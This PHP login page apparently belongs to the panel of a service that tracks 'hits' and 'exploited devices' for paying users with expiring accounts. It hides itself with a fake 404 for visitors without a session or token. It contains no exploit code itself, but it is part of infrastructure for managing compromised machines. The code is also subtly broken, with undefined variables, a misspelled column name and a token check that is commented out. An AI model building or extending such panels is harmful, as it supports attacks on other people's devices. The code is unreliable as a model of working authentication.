
<?php
require_once('inc/config.php');
require_once 'inc/functions/lib/passwordLib.php';
?>
<?php
	if(!isset($_SESSION['admin']) && !isset($_SESSION['logged'])) {
		if(!isset($_GET['t']) || empty($_GET['t'])) {
			header("HTTP/1.0 404 Not Found");
			die();
		} else {
			#$stmt = $dbh->prepare("SELECT token FROM users WHERE token = ? ");
			#$stmt->execute(array($t));
			#$user = $stmt->fetch();
			/*
			if($t!==$config['main']['token'] && $t!==$user['token']) {
				give404();
			}
			*/
		}
	}
ini_set('session.gc_maxlifetime', 10800); 
?>
<?php 
if (isset($_SESSION['logged']) && $_SESSION['logged'] == true) {
	header("Location: index.php");
	die();
} elseif (isset($_SESSION['logged']) && $_SESSION['admin'] == true) {
	header("Location: admin.php");
	die();
}
?>
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['user']) && !empty($_POST['pass']) && strlen($_POST['user']) > 4 && strlen($_POST['pass']) > 4) {
	$user = $_POST['user'];
	$pass = $_POST['pass'];
	// Admin check
	if ($user === $config['admin']['user'] && password_verify($pass, $config['admin']['pass'])) {
		$_SESSION['admin'] = true;
		session_regenerate_id();
		header("Location: admin.php");
		die();
	} else {
		$stmt = $dbh->prepare("SELECT id, name, pwd, uid, last_login, expiration FROM users WHERE name = ? AND expiration > ?");
		$stmt->execute(array($user, time()));
		
		if ($stmt->rowCount() > 0) {
	
			$user = $stmt->fetch();
			
			if (password_verify($pass, $user['pwd'])) {
				$stmt = $dbh->prepare("UPDATE users SET last_ip = ?, last_login = ? WHERE id = ?");
				$stmt->execute(array($_SERVER['REMOTE_ADDR'], time(), $user['id']));
				$_SESSION['logged'] = true;
				$_SESSION['name'] 	= $user['name'];
				$_SESSION['id']		= $user['id'];
				$_SESSION['uid']	= $user['uid'];

				$stmt = $dbh->prepare("SELECT count(*) FROM hits WHERE owner = ? AND timestamp > ? AND exploied = 0");
				$stmt->execute(array($id, time()));
				$new_hits = $stmt->fetchColumn();

				$stmt = $dbh->prepare("SELECT count(*) FROM hits WHERE owner = ? AND timestamp > ? AND exploited = 1");
				$stmt->execute(array($id, time()));

				$new_exploited = $stmt->fetchColumn();

				if ($new_hits > 0) {
					$_SESSION['notifications'][] = '
                            <li>
                                <a href="#">
                                    <div class="message-info">
                                        <span class="sender">System</span>
                                        <div class="message-content">There have been '.$new_hits.' new hits since your last login.</div>
                                    </div>
                                </a>
                            </li>';
				}

				if ($new_exploited > 0) {
					$_SESSION['notifications'][] = '
                            <li>
                                <a href="#">
                                    <div class="message-info">
                                        <span class="sender">System</span>
                                        <div class="message-content">'.$total_exploited.' new exploited devices since your last login.</div>
                                    </div>
                                </a>
                            </li>';
				}

				if (($user['expiration']-time()) < 86400) {
					$_SESSION['notifications'][] = '
                            <li>
                                <a href="#">
                                    <div class="message-info">
                                        <span class="sender">System</span>
                                        <div class="message-content">Your account will expire in less than 24 hours.</div>
                                    </div>
                                </a>
                            </li>';
				}

				header("Location: index.php");
				die();
			}
		}
	}
}
?>
<!DOCTYPE html>
<html >
  <head>
    <meta charset="UTF-8">
    <title>Login</title>
	
	    <link rel="stylesheet" type="text/css" href="static/css/login.css">
        <script src="static/js/login.min.js"></script>
  </head>
  <body>
    <div class="body"></div>
		<div class="grad"></div>
		<div class="header">
			<div><?php echo $config['main']['header1'] ?><span><?php echo $config['main']['header2'] ?></span></div>
		</div>
		<br>
		<div class="login">
			<form method="post" action="">
				<input type="text" placeholder="username" name="user"><br>
				<input type="password" placeholder="password" name="pass"><br>
				<input type="submit" value="Login">
			</form>
		</div>
    <script src='static/js/jquery-2.1.3.min.js'></script>
  </body>
</html>
